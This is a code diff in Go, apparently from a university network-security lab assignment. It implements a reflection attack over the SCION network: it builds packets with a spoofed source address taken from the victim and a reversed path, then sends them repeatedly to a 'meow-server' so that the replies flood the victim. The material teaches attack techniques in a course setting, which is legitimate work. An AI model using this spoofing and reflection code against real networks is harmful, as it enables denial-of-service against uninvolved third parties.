@@ -10,17 +10,20 @@ import (
 	"context"
 	"fmt"
 	"log"
+	"net"
 	"time"
 
+	"github.com/scionproto/scion/go/lib/common"
 	"github.com/scionproto/scion/go/lib/daemon"
 	"github.com/scionproto/scion/go/lib/snet"
+	"github.com/scionproto/scion/go/lib/topology/underlay"
 
 	// "ethz.ch/netsec/isl/handout/attack/server"
 	"github.com/scionproto/scion/go/lib/addr"
 
 	// "github.com/scionproto/scion/go/lib/daemon"
 	"github.com/scionproto/scion/go/lib/sock/reliable"
-	// "github.com/scionproto/scion/go/lib/spath"
+	"github.com/scionproto/scion/go/lib/spath"
 )
 
 func GenerateAttackPayload() []byte {
@@ -59,9 +62,58 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 		log.Fatal(err)
 	}
 	ia, err := sciondConn.LocalIA(ctx)
+	// ia.A = 281105609527573
+	fmt.Println("SEP0")
+	var a []snet.Path
+	a, err = sciondConn.Paths(ctx, spoofedAddr.IA, meow_addr.IA, daemon.PathReqFlags{})
+	fmt.Println(a)
+	fmt.Println(sciondConn.ASInfo(ctx, spoofedAddr.IA))
+	fmt.Println("SEP")
 	netnet := snet.NewNetwork(ia, dispatcher, nil)
-	conn, err := netnet.Dial(ctx, "udp", spoofedAddr.Host, meow_addr, addr.SvcNone)
-	fmt.Println(netnet)
+	fmt.Println(spoofedAddr.Host)
+	// spoofedAddr.Host.Port = 8011
+	// spoofedAddr.Host =
+	// conn, err := netnet.Dial(ctx, "udp", spoofedAddr.Host, meow_addr, addr.SvcNone)
+	packetConn, _, err := netnet.Dispatcher.Register(ctx, ia, spoofedAddr.Host, addr.SvcNone)
+
+	var (
+		dst     snet.SCIONAddress
+		port    int
+		path    spath.Path
+		nextHop *net.UDPAddr
+	)
+	dst, port, path = snet.SCIONAddress{IA: meow_addr.IA, Host: addr.HostFromIP(meow_addr.Host.IP)},
+		meow_addr.Host.Port, meow_addr.Path
+	nextHop = &net.UDPAddr{
+		IP:   meow_addr.Host.IP,
+		Port: underlay.EndhostPort,
+		Zone: meow_addr.Host.Zone,
+	}
+	// path = a[0].Path().Reverse()
+	// path = a[len(a)-1].Path()
+	spoofedAddr.Path = a[0].Path()
+	spoofedAddr.Path.Reverse()
+	path = spoofedAddr.Path
+	// var p *spath.Path = &(a[0].Path())
+	pkt := &snet.Packet{
+		Bytes: snet.Bytes(make([]byte, common.SupportedMTU)),
+		PacketInfo: snet.PacketInfo{
+			Destination: dst,
+			Source: snet.SCIONAddress{IA: spoofedAddr.IA,
+				Host: addr.HostFromIP(spoofedAddr.Host.IP)},
+			Path: path,
+			Payload: snet.UDPPayload{
+				SrcPort: uint16(spoofedAddr.Host.Port),
+				DstPort: uint16(port),
+				Payload: payload,
+			},
+		},
+	}
+
+	// conn.mtx.Lock()
+	// c.mtx.Lock()
+	// defer c.mtx.Unlock()
+	// packetConn.WriteTo(pkt, nextHop)
 	// TODO: Reflection Task
 	// Set up a scion connection with the meow-server
 	// and spoof the return address to reflect to the victim.
@@ -71,10 +123,13 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 	// ret, err := conn.Write(payload)
 	// fmt.Println(ret)
 	// fmt.Println(err)
-	payload = []byte{0}
-	fmt.Println(AttackDuration())
+	// payload = []byte{0}
+	// *conn.scionConnWriter = 281105609527573
+	// conn.Write(payload)
+
 	for start := time.Now(); time.Since(start) < AttackDuration(); {
-		conn.Write(payload)
+		packetConn.WriteTo(pkt, nextHop)
+		// conn.Write(payload)
 		// fmt.Println(ret)
 		// fmt.Println(err)
 
